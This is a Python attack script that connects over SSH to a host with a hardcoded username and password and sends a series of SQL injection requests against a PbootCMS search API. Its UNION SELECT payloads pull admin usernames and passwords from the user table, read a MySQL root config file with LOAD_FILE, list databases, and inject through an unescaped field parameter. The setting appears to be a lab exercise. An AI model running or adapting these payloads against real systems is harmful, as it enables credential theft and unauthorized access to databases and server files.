#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Test SQLi on A1 with proper comment syntax and various payloads"""
import paramiko
import sys
import urllib.parse

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

user = 'gdadmin'
pwd = 'Gdadmin@123'

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:180]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        try:
            print(f"  {out.strip()[:2000]}")
        except:
            print(f"  [output {len(out.strip())} chars]")
    if err.strip() and ec != 0:
        try:
            print(f"  [err] {err.strip()[:300]}")
        except:
            print(f"  [err suppressed]")
    return out, err, ec

c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

print("="*60)
print("SQLi TESTING ON A1 PbootCMS API")
print("="*60)

# The SQL being injected:
# SELECT id, title, author, date FROM ay_content
# WHERE status = 1 AND title LIKE '%KEYWORD%'
# ORDER BY date DESC LIMIT 10

# Test 1: Basic error confirmation (done ✅)
print("\n--- 1. Error confirmation (single quote) ---")
# Already confirmed: SQL error exposed

# Test 2: Comment types
print("\n--- 2. Test # comment (MySQL hash) ---")
# Payload: test'#
# This should comment out everything after #
payload = "test'%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Test 3: UNION with # comment
print("\n--- 3. UNION SELECT with # comment ---")
# test' UNION SELECT 1,2,3,4#
# URL: test%27%20UNION%20SELECT%201,2,3,4%23
payload = "test%27%20UNION%20SELECT%201,2,3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Test 4: Extract admin password
print("\n--- 4. Extract admin credentials ---")
# test' UNION SELECT 1,username,password,4 FROM ay_user#
payload = "test%27%20UNION%20SELECT%201,username,password,4%20FROM%20ay_user%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Test 5: Extract MySQL version
print("\n--- 5. Extract MySQL version ---")
# test' UNION SELECT 1,@@version,3,4#
payload = "test%27%20UNION%20SELECT%201,@@version,3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Test 6: LOAD_FILE for A-4 chain
print("\n--- 6. LOAD_FILE MySQL root config ---")
# test' UNION SELECT 1,LOAD_FILE('/etc/mysql/mysql.conf.d/root.cnf'),3,4#
# URL encode the path
path = urllib.parse.quote("/etc/mysql/mysql.conf.d/root.cnf")
payload = f"test%27%20UNION%20SELECT%201,LOAD_FILE({path}),3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Test 7: Extract all users
print("\n--- 7. Extract all ay_user records ---")
# test' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM ay_user#
payload = "test%27%20UNION%20SELECT%201,GROUP_CONCAT(username,0x3a,password),3,4%20FROM%20ay_user%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Test 8: Try to read database.php for cross-DB creds
print("\n--- 8. Read database config (cross-DB) ---")
# First check current database
# test' UNION SELECT 1,database(),3,4#
payload = "test%27%20UNION%20SELECT%201,database(),3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Test 9: Check other databases
print("\n--- 9. List all databases ---")
# test' UNION SELECT 1,GROUP_CONCAT(SCHEMA_NAME),3,4 FROM information_schema.SCHEMATA#
payload = "test%27%20UNION%20SELECT%201,GROUP_CONCAT(SCHEMA_NAME),3,4%20FROM%20information_schema.SCHEMATA%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

# Test 10: Check field parameter abuse
print("\n--- 10. Test field parameter injection (secondary param) ---")
# The field parameter goes directly into the SQL without escaping:
# AND {$field} LIKE '%{$keyword}%'
# Try to break out of the LIKE clause
run(c1, "curl -s 'http://localhost/api.php/search?field=title&keyword=test' 2>&1")
# Try injection via field parameter
run(c1, "curl -s \"http://localhost/api.php/search?field=title)%20UNION%20SELECT%201,2,3,4%20FROM%20ay_user%23&keyword=test\" 2>&1")

c1.close()
print("\nDone!")
